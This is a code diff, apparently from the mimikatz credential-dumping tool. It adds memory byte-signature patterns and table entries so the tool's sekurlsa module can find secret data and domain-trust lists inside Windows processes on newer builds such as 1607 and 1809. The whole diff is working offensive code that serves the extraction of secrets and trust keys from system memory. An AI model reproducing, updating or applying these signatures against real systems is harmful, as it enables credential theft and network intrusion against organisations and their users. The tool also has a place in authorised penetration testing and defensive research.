@@ -438,12 +438,14 @@ BYTE PTRN_W2K3_SecData[]	= {0x48, 0x8d, 0x6e, 0x30, 0x48, 0x8d, 0x0d};
 BYTE PTRN_W2K8_SecData[]	= {0x48, 0x8d, 0x94, 0x24, 0xb0, 0x00, 0x00, 0x00, 0x48, 0x8d, 0x0d};
 BYTE PTRN_W2K12_SecData[]	= {0x4c, 0x8d, 0x85, 0x30, 0x01, 0x00, 0x00, 0x48, 0x8d, 0x15};
 BYTE PTRN_W2K12R2_SecData[]	= {0x0f, 0xb6, 0x4c, 0x24, 0x30, 0x85, 0xc0, 0x0f, 0x45, 0xcf, 0x8a, 0xc1};
+BYTE PTRN_W2K19_SecData[]	= {0x44, 0x8b, 0x45, 0x80, 0x85, 0xc0, 0x0f, 0x84};
 KULL_M_PATCH_GENERIC SecDataReferences[] = {
 	{KULL_M_WIN_BUILD_2K3,		{sizeof(PTRN_W2K3_SecData),		PTRN_W2K3_SecData},		{0, NULL}, {  7, 37}},
 	{KULL_M_WIN_BUILD_VISTA,	{sizeof(PTRN_W2K8_SecData),		PTRN_W2K8_SecData},		{0, NULL}, { 11, 39}},
 	{KULL_M_WIN_BUILD_8,		{sizeof(PTRN_W2K12_SecData),	PTRN_W2K12_SecData},	{0, NULL}, { 10, 39}},
 	{KULL_M_WIN_BUILD_BLUE,		{sizeof(PTRN_W2K12R2_SecData),	PTRN_W2K12R2_SecData},	{0, NULL}, {-12, 39}},
-	{KULL_M_WIN_BUILD_10_1507,		{sizeof(PTRN_W2K12R2_SecData),	PTRN_W2K12R2_SecData},	{0, NULL}, { -9, 39}},
+	{KULL_M_WIN_BUILD_10_1507,	{sizeof(PTRN_W2K12R2_SecData),	PTRN_W2K12R2_SecData},	{0, NULL}, { -9, 39}},
+	{KULL_M_WIN_BUILD_10_1809,	{sizeof(PTRN_W2K19_SecData),	PTRN_W2K19_SecData},	{0, NULL}, { -9, 39}},
 };
 #elif defined(_M_IX86)
 BYTE PTRN_W2K3_SecData[]	= {0x53, 0x56, 0x8d, 0x45, 0x98, 0x50, 0xb9};
@@ -665,9 +667,11 @@ NTSTATUS kuhl_m_sekurlsa_dpapi_system(int argc, wchar_t * argv[])
 #if defined(_M_X64) || defined(_M_ARM64) // TODO:ARM64
 BYTE PTRN_W2K8R2_DomainList[]	= {0xf3, 0x0f, 0x6f, 0x6c, 0x24, 0x30, 0xf3, 0x0f, 0x7f, 0x2d};
 BYTE PTRN_W2K12R2_DomainList[]	= {0x0f, 0x10, 0x45, 0xf0, 0x66, 0x48, 0x0f, 0x7e, 0xc0, 0x0f, 0x11, 0x05};
+BYTE PTRN_W2K16_DomainList[] = {0x48, 0x8b, 0xfa, 0x48, 0x8b, 0xf1, 0xeb};
 KULL_M_PATCH_GENERIC DomainListReferences[] = {
-	{KULL_M_WIN_BUILD_7,	{sizeof(PTRN_W2K8R2_DomainList),		PTRN_W2K8R2_DomainList},	{0, NULL}, {10}},
-	{KULL_M_WIN_BUILD_BLUE,		{sizeof(PTRN_W2K12R2_DomainList),	PTRN_W2K12R2_DomainList},	{0, NULL}, {8}},
+	{KULL_M_WIN_BUILD_7,		{sizeof(PTRN_W2K8R2_DomainList),	PTRN_W2K8R2_DomainList},	{0, NULL}, {10}},
+	{KULL_M_WIN_BUILD_BLUE,		{sizeof(PTRN_W2K12R2_DomainList),	PTRN_W2K12R2_DomainList},	{0, NULL}, { 8}},
+	{KULL_M_WIN_BUILD_10_1607,	{sizeof(PTRN_W2K16_DomainList),		PTRN_W2K16_DomainList},		{0, NULL}, {-4}},
 };
 NTSTATUS kuhl_m_sekurlsa_trust(int argc, wchar_t * argv[])
 {
